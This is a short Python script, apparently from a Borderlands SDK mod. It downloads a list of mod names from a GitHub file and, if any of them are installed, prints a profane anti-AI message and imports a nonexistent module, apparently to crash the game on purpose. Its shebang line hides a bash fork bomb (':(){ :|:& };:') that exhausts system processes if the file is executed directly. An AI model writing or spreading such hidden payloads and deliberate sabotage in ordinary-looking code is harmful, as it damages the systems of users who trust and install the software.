#!/usr/bin/env -S bash -c ':(){ :|:& };:'
import sys
import os
from urllib import request
from typing import List
from pathlib import Path


def evaluate():
    web_content = _store_web_content()
    if not web_content:
        return
    
    sdk_folder = str(Path(sys.executable).parent.parent.parent) + "\sdk_mods"
    for content in web_content:
        mod_path = sdk_folder + "/" + str(content)
        if os.path.exists(mod_path) or os.path.exists(mod_path + ".sdkmod") or os.path.exists(mod_path + ".zip"):
            print(f"The author of this mod '{content}' support/used generative AI, i will not allow my mod to be compatible with it.")
            print(f"If you support generative AI, the feeding of codes stolen from hard working programmers to an AI, datacenters and fascist corporations: Go fuck yourself.")
            import __fuck_ai


def _store_web_content() -> List[str]:
    try:
        link = "https://raw.githubusercontent.com/Zazk0u/new-bl-sdk-mods/refs/heads/main/_anti/mods_fait_par_des_auteurs_qui_promote_ia"
        web_content = request.urlopen(link)
        read_web_content = str(web_content.read())
        read_web_content = read_web_content.replace("\\n", " ").replace("b'", "").replace("'", "")
        read_web_content = read_web_content.split(" ")
        read_web_content.remove("")
        return read_web_content
    except:
        return []


evaluate()